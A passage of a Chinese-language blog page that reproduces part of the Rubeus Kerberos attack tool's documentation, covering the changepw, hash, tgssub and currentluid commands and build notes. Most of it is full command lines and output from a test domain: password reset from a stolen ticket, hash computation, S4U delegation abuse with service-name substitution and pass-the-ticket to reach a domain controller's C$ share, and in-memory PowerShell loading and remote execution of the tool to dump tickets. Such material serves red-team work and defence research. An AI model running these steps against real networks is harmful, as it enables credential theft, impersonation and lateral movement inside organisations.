+<h3 id="changepw"><a href="#changepw" class="headerlink" title="changepw"></a>changepw</h3><p> <strong>changepw</strong> 函数 将采用用户的 TGT .kirbi blob，并以指定的 <code>/new:PASSWORD</code> 值执行 MS kpasswd 密码更改。如果没有指定 <code>/dc</code>，则提取计算机当前的域控制器作为密码重置流量的目的地。这就是 2014 年披露的 Aorato Kerberos 密码重置，相当于 kekeo 的 <strong>misc::changepw</strong> 函数。</p>
+<p>宁可以使用  <a href="#asktgt">asktgt</a> 命令检索 TGT blob。</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe changepw /ticket:doIFFjCCBRKgA...(snip)...== /new:Password123!
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.3
+
+[*] Action: Reset User Password (AoratoPw)
+
+[*] Changing password for user: harmj0y@TESTLAB.LOCAL
+[*] New password value: Password123!
+[*] Building AP-REQ for the MS Kpassword request
+[*] Building Authenticator with encryption key type: rc4_hmac
+[*] base64(session subkey): nX2FOQ3RsGxoI8uqIg1zlg==
+[*] Building the KRV-PRIV structure
+[*] Connecting to 192.168.52.100:464
+[*] Sent 1347 bytes
+[*] Received 167 bytes
+[+] Password change success!</code></pre>
+<h3 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h3><p><strong>hash</strong> 函数 将采用 <code>/password:X</code> 和可选的 <code>/user:USER</code> 和/或 <code>/domain:DOMAIN</code>。他使用 <strong>kerberos:hash</strong>（KERB_ECRYPT HashPassword）方法生成密码的 rc4_hmac（NTLM）形式。如果指定了用户和域名，则会生成 aes128_cts_hmac_sha1、aes256_cts_hmac_sha1、des_cbc_md5 hash 形式。用户和域名被用作 AES 和 DES 实现的盐。</p>
+<p>计算密码的 rc4_hmac hash：</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe hash /password:Password123!
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.4.0
+
+
+[*] Action: Calculate Password Hashes
+
+[*] Input password             : Password123!
+[*]       rc4_hmac             : 2B576ACBE6BCFDA7294D6BD18041B8FE
+
+[!] /user:X and /domain:Y need to be supplied to calculate AES and DES hash types!</code></pre>
+<p>计算所有的 hash 格式：</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe hash /password:Password123! /user:harmj0y /domain:testlab.local
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.4.0
+
+
+[*] Action: Calculate Password Hashes
+
+[*] Input password             : Password123!
+[*] Input username             : harmj0y
+[*] Input domain               : testlab.local
+[*] Salt                       : TESTLAB.LOCALharmj0y
+[*]       rc4_hmac             : 2B576ACBE6BCFDA7294D6BD18041B8FE
+[*]       aes128_cts_hmac_sha1 : B0A79AB550536860123B427C14F2A531
+[*]       aes256_cts_hmac_sha1 : F7FEBF9779401B653911A56A79FF9E3A58F7F8990FDB3D9CA0E89227ABF13287
+[*]       des_cbc_md5          : 614589E66D6B3792</code></pre>
+<h3 id="tgssub"><a href="#tgssub" class="headerlink" title="tgssub"></a>tgssub</h3><p><strong>tgssub</strong> 函数将采用服务票据 base64/文件 规范，并在服务票据中替换一个服务名称。这对滥用 S4U 和其他情况很有用。</p>
+<p><code>/altservice:X</code> 参数使必需的，可以使独立的 sname（ldap、cifs 等），也可以使完整的 SPN（cifs/computer.domain.com）。后者在某些 滥用 S4U2Self 的场景中（基于资源的受限委派）很有用。更多信息请参考 <a target="_blank" rel="noopener" href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">文章</a></p>
+<p><code>/ptt</code> 参数将进行 pass-the-ticket，并将产生的 kerberos 凭证应用到当前的登录会话中。<code>/luid:0xA..</code>  参数将把票据应用于指定的登录会话 ID（需要提权），而不是当前的登录会话。</p>
+<p>执行 S4U2Self 和 S4U2Proxy 过程来滥用传统的受限委派，并在最终的票据中替换 sname。这样就无需再次执行 S4U 过程了：</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe s4u /user:patsy /rc4:2B576ACBE6BCFDA7294D6BD18041B8FE /msdsspn:ldap/PRIMARY.testlab.local /impersonateuser:harmj0y /ptt
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.4.2
+
+[*] Action: Ask TGT
+
+[*] Using rc4_hmac hash: 2B576ACBE6BCFDA7294D6BD18041B8FE
+[*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+[*] Building AS-REQ (w/ preauth) for: &#39;testlab.local\patsy&#39;
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+    doIE+jCCBPagAwIBBaEDAgEWoo...(snip)...
+
+
+[*] Action: S4U
+
+[*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+[*] Building S4U2self request for: &#39;patsy@TESTLAB.LOCAL&#39;
+[*] Sending S4U2self request
+[+] S4U2self success!
+[*] Got a TGS for &#39;harmj0y@TESTLAB.LOCAL&#39; to &#39;patsy@TESTLAB.LOCAL&#39;
+[*] base64(ticket.kirbi):
+
+    doIFXjCCBVqgAwIBBaEDAgEWoo...(snip)...
+
+[*] Impersonating user &#39;harmj0y&#39; to target SPN &#39;ldap/PRIMARY.testlab.local&#39;
+[*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+[*] Building S4U2proxy request for service: &#39;ldap/PRIMARY.testlab.local&#39;
+[*] Sending S4U2proxy request
+[+] S4U2proxy success!
+[*] base64(ticket.kirbi) for SPN &#39;ldap/PRIMARY.testlab.local&#39;:
+
+    doIGPjCCBjqgAwIBBaEDAgEWoo...(snip)...
+
+[*] Action: Import Ticket
+[+] Ticket successfully imported!
+
+C:\Rubeus&gt;dir \\primary.testlab.local\C$
+Access is denied.
+
+C:\Rubeus&gt;Rubeus.exe tgssub /ticket:doIGPjCCBjqgAwIBBaEDAgEWoo...(snip)... /altservice:cifs /ptt
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.4.2
+
+
+[*] Action: Service Ticket sname Substitution
+
+[*] Substituting in alternate service name: cifs
+[*] base64(ticket.kirbi):
+
+    doIGPjCCBjqgAwIBBaEDAgEWoo...(snip)...
+
+[*] Action: Describe Ticket
+
+UserName              :  harmj0y@TESTLAB.LOCAL
+UserRealm             :  TESTLAB.LOCAL
+ServiceName           :  cifs/PRIMARY.testlab.local
+ServiceRealm          :  TESTLAB.LOCAL
+StartTime             :  3/1/2019 12:51:06 PM
+EndTime               :  3/1/2019 5:51:06 PM
+RenewTill             :  3/8/2019 12:51:06 PM
+Flags                 :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
+KeyType               :  aes128_cts_hmac_sha1
+Base64(key)           :  yxQVMhl0qn3P0wUUC4KnGQ==
+
+
+[*] Action: Import Ticket
+[+] Ticket successfully imported!
+
+C:\Rubeus&gt;dir \\primary.testlab.local\C$
+Volume in drive \\primary.testlab.local\C$ has no label.
+Volume Serial Number is A48B-4D68
+
+Directory of \\primary.testlab.local\C$
+
+07/05/2018  12:57 PM    &lt;DIR&gt;          dumps
+03/05/2017  04:36 PM    &lt;DIR&gt;          inetpub
+07/21/2018  07:41 PM                 9 out.txt
+08/22/2013  07:52 AM    &lt;DIR&gt;          PerfLogs
+04/15/2017  05:25 PM    &lt;DIR&gt;          profiles
+08/28/2018  11:51 AM    &lt;DIR&gt;          Program Files
+08/28/2018  11:51 AM    &lt;DIR&gt;          Program Files (x86)
+10/09/2018  12:04 PM    &lt;DIR&gt;          Temp
+08/23/2018  03:52 PM    &lt;DIR&gt;          Users
+10/25/2018  01:15 PM    &lt;DIR&gt;          Windows
+            1 File(s)              9 bytes
+            9 Dir(s)  40,463,851,520 bytes free
+
+C:\Rubeus&gt;Rubeus.exe klist
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.4.2
+
+
+
+[*] Action: List Kerberos Tickets (Current User)
+
+[*] Current LUID    : 0x6de14
+
+    [0] - 0x12 - aes256_cts_hmac_sha1
+    Start/End/MaxRenew: 3/1/2019 12:51:06 PM ; 3/1/2019 5:51:06 PM ; 3/8/2019 12:51:06 PM
+    Server Name       : cifs/PRIMARY.testlab.local @ TESTLAB.LOCAL
+    Client Name       : harmj0y @ TESTLAB.LOCAL
+    Flags             : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable (40a50000)
+
+    [1] - 0x12 - aes256_cts_hmac_sha1
+    Start/End/MaxRenew: 3/1/2019 12:51:06 PM ; 3/1/2019 5:51:06 PM ; 3/8/2019 12:51:06 PM
+    Server Name       : ldap/PRIMARY.testlab.local @ TESTLAB.LOCAL
+    Client Name       : harmj0y @ TESTLAB.LOCAL
+    Flags             : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable (40a50000)</code></pre>
+<p>使用机器账户 hash 执行 S4U2Self 到一台机器，替换（我们想要访问到的）服务名称</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe s4u /user:primary$ /rc4:46b910dbe4514bd144b44cb554c256db /impersonateuser:harmj0y
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.4.2
+
+[*] Action: Ask TGT
+
+[*] Using rc4_hmac hash: 46b910dbe4514bd144b44cb554c256db
+[*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+[*] Building AS-REQ (w/ preauth) for: &#39;testlab.local\primary$&#39;
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+    doIFIDCCBRygAwIBBaEDAgEWoo...(snip)...
+
+
+[*] Action: S4U
+
+[*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+[*] Building S4U2self request for: &#39;primary$@TESTLAB.LOCAL&#39;
+[*] Sending S4U2self request
+[+] S4U2self success!
+[*] Got a TGS for &#39;harmj0y@TESTLAB.LOCAL&#39; to &#39;primary$@TESTLAB.LOCAL&#39;
+[*] base64(ticket.kirbi):
+
+    doIFgDCCBXygAwIBBaEDAgEWoo...(snip)...
+
+
+C:\Rubeus&gt;Rubeus.exe describe /ticket:doIFgDCCBXygAwIBBaEDAgEWoo...(snip)...
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.4.2
+
+
+[*] Action: Describe Ticket
+
+UserName              :  harmj0y@TESTLAB.LOCAL
+UserRealm             :  TESTLAB.LOCAL
+ServiceName           :  primary$
+ServiceRealm          :  TESTLAB.LOCAL
+StartTime             :  3/1/2019 12:43:56 PM
+EndTime               :  3/1/2019 5:43:56 PM
+RenewTill             :  3/8/2019 12:43:56 PM
+Flags                 :  name_canonicalize, ok_as_delegate, pre_authent, renewable
+KeyType               :  aes256_cts_hmac_sha1
+Base64(key)           :  X6LnSCb4FUGo4Wec2FnfgQRz0h8zfgIRZxENxcIoIpU=
+
+[!] Service ticket uses encryption key type &#39;aes256_cts_hmac_sha1&#39;, unable to extract hash and salt.
+
+
+C:\Rubeus&gt;dir \\primary.testlab.local\C$
+Access is denied.
+
+C:\Rubeus&gt;Rubeus.exe purge
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.4.2
+
+Luid: 0x0
+
+[*] Action: Purge Tickets
+[+] Tickets successfully purged!
+
+C:\Rubeus&gt;Rubeus.exe tgssub /ticket:doIFgDCCBXygAwIBBaEDAgEWoo...(snip)... /altservice:cifs/primary.testlab.local /ptt
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.4.2
+
+
+[*] Action: Service Ticket sname Substitution
+
+[*] Substituting in alternate service name: cifs/primary.testlab.local
+[*] base64(ticket.kirbi):
+
+    doIFpjCCBaKgAwIBBaEDAgEWoo...(snip)...
+
+[*] Action: Describe Ticket
+
+UserName              :  harmj0y@TESTLAB.LOCAL
+UserRealm             :  TESTLAB.LOCAL
+ServiceName           :  cifs/primary.testlab.local
+ServiceRealm          :  TESTLAB.LOCAL
+StartTime             :  3/1/2019 12:43:56 PM
+EndTime               :  3/1/2019 5:43:56 PM
+RenewTill             :  3/8/2019 12:43:56 PM
+Flags                 :  name_canonicalize, ok_as_delegate, pre_authent, renewable
+KeyType               :  aes256_cts_hmac_sha1
+Base64(key)           :  X6LnSCb4FUGo4Wec2FnfgQRz0h8zfgIRZxENxcIoIpU=
+
+
+[*] Action: Import Ticket
+[+] Ticket successfully imported!
+
+C:\Rubeus&gt;dir \\primary.testlab.local\C$
+Volume in drive \\primary.testlab.local\C$ has no label.
+Volume Serial Number is A48B-4D68
+
+Directory of \\primary.testlab.local\C$
+
+07/05/2018  12:57 PM    &lt;DIR&gt;          dumps
+03/05/2017  04:36 PM    &lt;DIR&gt;          inetpub
+08/22/2013  07:52 AM    &lt;DIR&gt;          PerfLogs
+04/15/2017  05:25 PM    &lt;DIR&gt;          profiles
+08/28/2018  11:51 AM    &lt;DIR&gt;          Program Files
+08/28/2018  11:51 AM    &lt;DIR&gt;          Program Files (x86)
+10/09/2018  12:04 PM    &lt;DIR&gt;          Temp
+08/23/2018  03:52 PM    &lt;DIR&gt;          Users
+10/25/2018  01:15 PM    &lt;DIR&gt;          Windows
+            1 File(s)              9 bytes
+            9 Dir(s)  40,462,831,616 bytes free</code></pre>
+<h3 id="currentluid"><a href="#currentluid" class="headerlink" title="currentluid"></a>currentluid</h3><p><strong>currentluid</strong> 函数 将显示当前用户的 Logon ID（LUID）。</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe currentluid
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.5.0
+
+
+[*] Action: Display current LUID
+
+[*] Current LogonID (LUID) : 0x121078 (1183864)</code></pre>
+<h2 id="编译指令"><a href="#编译指令" class="headerlink" title="编译指令"></a>编译指令</h2><p>We are not planning on releasing binaries for Rubeus, so you will have to compile yourself :)</p>
+<p>Rubeus has been built against .NET 3.5 and is compatible with <a target="_blank" rel="noopener" href="https://visualstudio.microsoft.com/vs/community/">Visual Studio 2019 Community Edition</a>. Simply open up the project .sln, choose “Release”, and build.</p>
+<h3 id="针对其他-NET-版本"><a href="#针对其他-NET-版本" class="headerlink" title="针对其他 .NET 版本"></a>针对其他 .NET 版本</h3><p>Rubeus’ default build configuration is for .NET 3.5, which will fail on systems without that version installed. To target Rubeus for .NET 4 or 4.5, open the .sln solution, go to <strong>Project</strong> -&gt; <strong>Rubeus Properties</strong> and change the “Target framework” to another version.</p>
+<h3 id="旁注-Building-Rubeus-as-a-Library"><a href="#旁注-Building-Rubeus-as-a-Library" class="headerlink" title="旁注: Building Rubeus as a Library"></a>旁注: Building Rubeus as a Library</h3><p>To build Rubeus as a library, under <strong>Project</strong> -&gt; <strong>Rubeus Properties</strong> -&gt; change <strong>Output type</strong> to <strong>Class Library</strong>. Compile, and add the Rubeus.dll as a reference to whatever project you want. Rubeus functionality can then be invoked as in a number of ways:</p>
+<pre><code>// pass the Main method the arguments you want
+Rubeus.Program.Main(&quot;dump /luid:3050142&quot;.Split());
+
+// or invoke specific functionality manually
+Rubeus.LSA.ListKerberosTicketDataAllUsers(new Rubeus.Interop.LUID());</code></pre>
+<p>You can then use <a target="_blank" rel="noopener" href="https://www.microsoft.com/en-us/download/details.aspx?displaylang=en&id=17630">ILMerge</a> to merge the Rubeus.dll into your resulting project assembly for a single, self-contained file.</p>
+<h3 id="旁注-Running-Rubeus-Through-PowerShell"><a href="#旁注-Running-Rubeus-Through-PowerShell" class="headerlink" title="旁注: Running Rubeus Through PowerShell"></a>旁注: Running Rubeus Through PowerShell</h3><p>If you want to run Rubeus in-memory through a PowerShell wrapper, first compile the Rubeus and base64-encode the resulting assembly:</p>
+<pre><code>[Convert]::ToBase64String([IO.File]::ReadAllBytes(&quot;C:\Temp\Rubeus.exe&quot;)) | Out-File -Encoding ASCII C:\Temp\rubeus.txt</code></pre>
+<p>Rubeus can then be loaded in a PowerShell script with the following (where “aa…” is replaced with the base64-encoded Rubeus assembly string):</p>
+<pre><code>$RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String(&quot;aa...&quot;))</code></pre>
+<p>The Main() method and any arguments can then be invoked as follows:</p>
+<pre><code>[Rubeus.Program]::Main(&quot;dump /user:administrator&quot;.Split())</code></pre>
+<p>Or individual functions can be invoked:</p>
+<pre><code>$TicketBytes = [convert]::FromBase64String(&#39;BASE64_KERB_TICKET&#39;)
+# start mmc.exe as netonly, not-hidden
+$LogonID = [Rubeus.Helpers]::CreateProcessNetOnly(&quot;mmc.exe&quot;, $true)
+# apply the ticket to mmc&#39;s logon session
+[Rubeus.LSA]::ImportTicket($TicketBytes, $LogonID)</code></pre>
+<h4 id="Sidenote-Sidenote-Running-Rubeus-Over-PSRemoting"><a href="#Sidenote-Sidenote-Running-Rubeus-Over-PSRemoting" class="headerlink" title="Sidenote Sidenote: Running Rubeus Over PSRemoting"></a>Sidenote Sidenote: Running Rubeus Over PSRemoting</h4><p>Due to the way PSRemoting handles output, we need to redirect stdout to a string and return that instead. Luckily, Rubeus has a function to help with that.</p>
+<p>If you follow the instructions in <a href="#sidenote-running-rubeus-through-powershell">Sidenote: Running Rubeus Through PowerShell</a> to create a Rubeus.ps1, append something like the following to the script:</p>
+<pre><code>[Rubeus.Program]::MainString(&quot;triage&quot;)</code></pre>
+<p>You should then be able to run Rubeus over PSRemoting with something like the following:</p>
+<pre><code>$s = New-PSSession dc.theshire.local
+Invoke-Command -Session $s -FilePath C:\Temp\Rubeus.ps1</code></pre>
+<p>Alternatively, Rubeus’ <code>/consoleoutfile:C:\FILE.txt</code> argument will redirect all output streams to the specified file.</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/09/28/Kerberos%20%E5%9F%BA%E7%A1%80%E4%B8%8E%E6%BB%A5%E7%94%A8/" rel="prev" title="Kerberos 基础与滥用（笔记）">
+      <i class="fa fa-chevron-left"></i> Kerberos 基础与滥用（笔记）
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/09/29/%E6%BB%A5%E7%94%A8%20DRS/" rel="next" title="DRS 基础及滥用（笔记）">
+      DRS 基础及滥用（笔记） <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Rubeus"><span class="nav-number">1.</span> <span class="nav-text">Rubeus</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%83%8C%E6%99%AF"><span class="nav-number">1.1.</span> <span class="nav-text">背景</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%BD%BF%E7%94%A8"><span class="nav-number">1.1.1.</span> <span class="nav-text">命令行使用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Opsec-%E7%AC%94%E8%AE%B0"><span class="nav-number">1.1.2.</span> <span class="nav-text">Opsec 笔记</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A6%E5%99%A8%E5%8C%96"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">武器化</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BE%8B%E5%AD%90%EF%BC%9A%E6%8F%90%E5%8F%96%E5%87%AD%E8%AF%81"><span class="nav-number">1.1.2.3.</span> <span class="nav-text">例子：提取凭证</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BE%8B%E5%AD%90%EF%BC%9A-Over-pass-the-hash"><span class="nav-number">1.1.2.4.</span> <span class="nav-text">例子： Over-pass-the-hash</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A5%A8%E6%8D%AE%E8%AF%B7%E6%B1%82%E5%92%8C%E7%BB%AD%E8%AE%A2"><span class="nav-number">1.2.</span> <span class="nav-text">票据请求和续订</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#asktgt"><span class="nav-number">1.2.1.</span> <span class="nav-text">asktgt</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#asktgs"><span class="nav-number">1.2.2.</span> <span class="nav-text">asktgs</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#renew"><span class="nav-number">1.2.3.</span> <span class="nav-text">renew</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#brute"><span class="nav-number">1.2.4.</span> <span class="nav-text">brute</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BB%A5%E7%94%A8%E5%8F%97%E9%99%90%E5%A7%94%E6%B4%BE"><span class="nav-number">1.3.</span> <span class="nav-text">滥用受限委派</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#s4u"><span class="nav-number">1.3.1.</span> <span class="nav-text">s4u</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A5%A8%E6%8D%AE%E7%AE%A1%E7%90%86"><span class="nav-number">1.4.</span> <span class="nav-text">票据管理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ptt"><span class="nav-number">1.4.1.</span> <span class="nav-text">ptt</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#purge"><span class="nav-number">1.4.2.</span> <span class="nav-text">purge</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#describe"><span class="nav-number">1.4.3.</span> <span class="nav-text">describe</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E5%8F%96%E5%92%8C%E8%8E%B7%E5%8F%96%E7%A5%A8%E6%8D%AE"><span class="nav-number">1.5.</span> <span class="nav-text">提取和获取票据</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#triage"><span class="nav-number">1.5.1.</span> <span class="nav-text">triage</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#klist"><span class="nav-number">1.5.2.</span> <span class="nav-text">klist</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dump"><span class="nav-number">1.5.3.</span> <span class="nav-text">dump</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tgtdeleg"><span class="nav-number">1.5.4.</span> <span class="nav-text">tgtdeleg</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#monitor"><span class="nav-number">1.5.5.</span> <span class="nav-text">monitor</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#harvest"><span class="nav-number">1.5.6.</span> <span class="nav-text">harvest</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%83%98%E7%83%A4"><span class="nav-number">1.6.</span> <span class="nav-text">烘烤</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#kerberoast"><span class="nav-number">1.6.1.</span> <span class="nav-text">kerberoast</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#kerberoasting-opsec"><span class="nav-number">1.6.1.1.</span> <span class="nav-text">kerberoasting opsec</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BE%8B%E5%AD%90"><span class="nav-number">1.6.1.2.</span> <span class="nav-text">例子</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#asreproast"><span class="nav-number">1.6.2.</span> <span class="nav-text">asreproast</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%82%E9%A1%B9"><span class="nav-number">1.7.</span> <span class="nav-text">杂项</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#createnetonly"><span class="nav-number">1.7.1.</span> <span class="nav-text">createnetonly</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#changepw"><span class="nav-number">1.7.2.</span> <span class="nav-text">changepw</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hash"><span class="nav-number">1.7.3.</span> <span class="nav-text">hash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tgssub"><span class="nav-number">1.7.4.</span> <span class="nav-text">tgssub</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#currentluid"><span class="nav-number">1.7.5.</span> <span class="nav-text">currentluid</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%96%E8%AF%91%E6%8C%87%E4%BB%A4"><span class="nav-number">1.8.</span> <span class="nav-text">编译指令</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%92%88%E5%AF%B9%E5%85%B6%E4%BB%96-NET-%E7%89%88%E6%9C%AC"><span class="nav-number">1.8.1.</span> <span class="nav-text">针对其他 .NET 版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%81%E6%B3%A8-Building-Rubeus-as-a-Library"><span class="nav-number">1.8.2.</span> <span class="nav-text">旁注: Building Rubeus as a Library</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%81%E6%B3%A8-Running-Rubeus-Through-PowerShell"><span class="nav-number">1.8.3.</span> <span class="nav-text">旁注: Running Rubeus Through PowerShell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Sidenote-Sidenote-Running-Rubeus-Over-PSRemoting"><span class="nav-number">1.8.3.1.</span> <span class="nav-text">Sidenote Sidenote: Running Rubeus Over PSRemoting</span></a></li></ol></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="T4nglong"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">T4nglong</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/T4nglong" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;T4nglong" rel="noopener" target="_blank"><i class="Github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:adamkk52000@gmail.com" title="E-Mail → mailto:adamkk52000@gmail.com" rel="noopener" target="_blank"><i class="Email fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
